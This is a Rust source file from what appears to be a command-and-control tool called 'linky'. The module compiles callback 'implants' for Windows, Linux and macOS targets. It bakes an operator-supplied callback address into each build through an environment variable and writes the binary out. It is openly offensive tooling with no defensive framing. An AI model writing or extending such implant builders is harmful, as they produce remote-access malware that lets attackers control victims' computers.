use std::fs;
use std::io;
use std::path::Path;
use std::process::{Command, ExitStatus};

pub fn generate_windows(callback: &str) {
    build(
        callback,
        "links/windows",
        "x86_64-pc-windows-gnu",
        "link.exe",
    );
}

pub fn generate_linux(callback: &str) {
    build(callback, "links/linux", "x86_64-unknown-linux-musl", "link");
}

pub fn generate_osx(callback: &str) {
    build(callback, "links/osx", "x86_64-apple-darwin", "link-osx");
}

// ── Internal ─────────────────────────────────────────────────────────────────

fn build(callback: &str, crate_dir: &str, target: &str, output_name: &str) {
    let dir = Path::new(crate_dir);
    if !dir.exists() {
        eprintln!(
            "[-] {} not found. Run linky from the workspace root.",
            crate_dir
        );
        return;
    }

    println!(
        "[*] Building {} implant ({}) for {} …",
        output_name, target, callback
    );

    let result = Command::new("cargo")
        .env("CALLBACK", callback)
        .args(["build", "--release", "--target", target])
        .current_dir(dir)
        .status();

    let binary = dir
        .join("target")
        .join(target)
        .join("release")
        .join(output_name);

    handle_result(result, &binary, output_name);
}

fn handle_result(status: io::Result<ExitStatus>, src: &Path, dest: &str) {
    match status {
        Ok(s) if s.success() => {
            if src.exists() {
                match fs::copy(src, dest) {
                    Ok(_) => println!("[+] Implant written to ./{}", dest),
                    Err(e) => eprintln!("[-] Copy failed: {}", e),
                }
            } else {
                eprintln!(
                    "[-] Build succeeded but binary not found at {}",
                    src.display()
                );
            }
        }
        Ok(s) => eprintln!("[-] Build failed (exit {})", s),
        Err(e) => eprintln!("[-] Failed to invoke cargo: {}", e),
    }
}
